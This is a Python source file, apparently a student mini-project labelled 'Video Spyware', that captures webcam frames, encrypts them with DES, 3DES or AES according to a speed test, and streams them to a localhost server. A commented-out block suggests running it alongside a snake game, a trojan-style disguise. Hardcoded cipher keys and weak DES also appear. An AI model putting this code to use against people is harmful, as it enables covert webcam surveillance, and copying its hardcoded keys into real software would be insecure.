# Gal Gabay 207006024
# Yechezkel Chen 325191419
# Mini-Project Video Spyware

import socket

# Image Processing
import threading

import cv2

# Encryption
from base64 import b64encode
from Crypto.Cipher import DES, DES3, AES
from Crypto.Util.Padding import pad

# Speed Test
from speedTest import SpeedTestResults

# Compress data
import zlib

# Data Structure
from typing import Union


# Network Speeds
# 0     - 0.1  MB/s     -> DES
# 0.1   - 0.3  MB/s     -> 3DES
# 0.5   - more MB/s     -> AES-128

# Resolutions
# 426x240   -> 240p
# 640x360   -> 360p
# 854x480   -> 480p

SERVER_IP = 'localhost'
SERVER_PORT = 5555
RUN_SPEED_TEST = True
END = b'END!'

ENCRYPTION_ALGORITHMS = {
	0: (DES, DES.block_size),
	1: (DES3, DES3.block_size),
	2: (AES, AES.block_size)
}

DES_KEY = b'F3Ur482C'  # 8 bytes
DES3_KEY = b'vO287xbs77klAOhOlkhLDebh'  # 24 bytes
AES_KEY = b'QO7xGRbb46KZhcAZ'  # 16 bytes


class Client:
	"""
	A client class that connects to a video streaming server and sends video frames from the default camera.
	"""

	def __init__(self, host: str, port: int, ci: int, width: int, height: int, end: bytes, des_key: bytes, des3_key: bytes, aes_key: bytes, camera_id: Union[int, str] = 0):
		"""
		Initialize the client with a host and port to connect to.
		Also creates a VideoCapture object to capture video.

		:param host: The IP address or hostname of the server
		:type host: str
		:param port: The port number of the server
		:type port: int
		:param ci:  Determine the encryption method (0 for DES, 1 for DES3, 2 for AES)
		:type ci: int
		:param width: Width of the frame
		:type width: int
		:param height: Height of the frame
		:type height: int
		:param end: Used for ending the communication
		:type end: bytes
		:param des_key: The symmetric key of the DES encryption
		:type des_key: bytes
		:param des3_key: The symmetric key of the DES3 encryption
		:type des3_key: bytes
		:param aes_key: The symmetric key of the AES encryption
		:type aes_key: bytes
		:param camera_id: ID of the camera to use. Default is 0, which is the default camera.
		:type camera_id: int or str
		"""
		self.host = host
		self.port = port
		self.camera_id = camera_id
		self.ci = ci
		self.w = width
		self.h = height
		self.end = end
		self.des_key = des_key
		self.des3_key = des3_key
		self.aes_key = aes_key
		self.cap = None
		self.client_socket = None

		try:
			self.cap = cv2.VideoCapture(self.camera_id)  # Capture video from specified camera
		except ValueError:
			raise ValueError("Invalid camera ID")

		try:
			self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			self.client_socket.connect((self.host, self.port))  # Connecting to the server
			print("Connected to, Host:{0} Port:{1}".format(self.host, self.port))
		except socket.error as e:
			print("Connection error: ", e)
			raise e

	def run(self):
		"""
		Set up the cipher mode and send frames to the server.
		This method captures video frames from the default camera,
		and send them to function 'encrypt_data'.
		the function encrypts them using one of the three encryption methods
		(DES, DES3, AES) based on the value of `self.ci` attribute.
		Then sends the encrypted frames to the server.
		Additionally, it closes the video capture and socket connection when the 'q' key is pressed by the server.
		Also, it uses the zlib library to compress the image data before sending it.
		"""

		# Set up the cipher mode, and send the cipher mode to the server
		if self.ci == 0:
			self.client_socket.sendall(b'0')
			print("Using DES...")
			key = self.des_key
		elif self.ci == 1:
			self.client_socket.sendall(b'1')
			print("Using DES3...")
			key = self.des3_key
		else:
			self.client_socket.sendall(b'2')
			print("Using AES...")
			key = self.aes_key

		# Send frames
		while self.cap.isOpened():
			# Capture video frame from the camera
			ret, frame = self.cap.read()

			# Resize the frame
			frame = cv2.resize(frame, (self.w, self.h))

			# Flip the frame
			frame = cv2.flip(frame, 1)

			# Encode the frame as jpeg
			data = cv2.imencode('.jpg', frame)[1].tobytes()

			if ret is False:
				# Release the video capture and close the socket connection
				self.cap.release()
				self.client_socket.close()
				exit(0)

			encrypt_data = self.encrypt_data(data, key)

			try:
				# Send the data to the server
				self.client_socket.sendall(encrypt_data)
			except ConnectionAbortedError:  # if the server pressure q
				print("Connection closed")
				self.client_socket.close()  # close the socket connection
				break

	def encrypt_data(self, data, key):
		"""
		Encrypt and compress the data using the specified algorithm and key.

		:param data: The data to encrypt and compress.
		:type data: bytes
		:param key: The key to use for encryption.
		:type key: bytes
		:returns: The encrypted and compressed data, along with the initialization vector.
		:rtype: bytes
		"""
		# Get the encryption algorithm and block size to use
		algorithm, block_size = ENCRYPTION_ALGORITHMS[self.ci]
		# Create a cipher object using the algorithm and key
		cipher = algorithm.new(key, algorithm.MODE_CBC)

		# Encrypt the data
		ct_bytes = cipher.encrypt(pad(data, block_size))

		# Encode the initialization vector and ciphertext
		iv = b64encode(cipher.iv)
		ct = b64encode(ct_bytes)

		# Compress the image data using zlib
		ct = zlib.compress(ct)

		return iv + ct + self.end


def speed_test():
	"""
	Test the network speed and return the download and upload rate and ping speed in MB/s.

	:return: The download and upload rate and ping speed in MB/s.
	:rtype: float
	"""
	print("Testing your network...")
	st = SpeedTestResults()
	download, upload, ping = st.get_results()
	if not download:  # if there is no internet connection
		exit(0)
	print("Your Network Speed Results:")
	print("Download: {0} MB/s, Upload: {1} MB/s, Ping: {2} ms".format(download, upload, ping))
	return upload


def setup_video_resolution(upload):
	"""
	This function sets up the resolution and cipher mode of a video,
	based on the download value passed as a parameter.
	:param download: a float value representing the download rate of the internet
	:return: a tuple containing the cipher mode (ci) as an integer,
			and the width and height of the video resolution as integers
	"""
	if float(upload) <= 0.1:
		ci = 0           # DES
		w, h = 426, 240  # 240p
	elif 0.1 < float(upload) <= 0.3:
		ci = 1           # DES3
		w, h = 640, 360  # 360p
	else:
		ci = 2           # AES-128
		w, h = 854, 480  # 480p
	return ci, w, h


def main():
	"""
	The main function is the entry point of the program,
	it handles the connection and configuration of the video streaming.
	"""

	upload = 0
	if RUN_SPEED_TEST:
		# Measure the internet connection speed and return a value for the download rate
		upload = speed_test()

	ci, w, h = setup_video_resolution(upload)

	# Create a client object and connect to the specified host and port
	# Pass the cipher mode, video resolution width and height, and a byte string as arguments
	sock = Client(SERVER_IP, SERVER_PORT, ci, w, h, END, DES_KEY, DES3_KEY, AES_KEY)

	# Run the client object
	sock.run()
	exit(0)

"""
if __name__ == "__main__":
	main()
	th = threading.Thread(target=snake.initialize_game)
	th.start()
"""
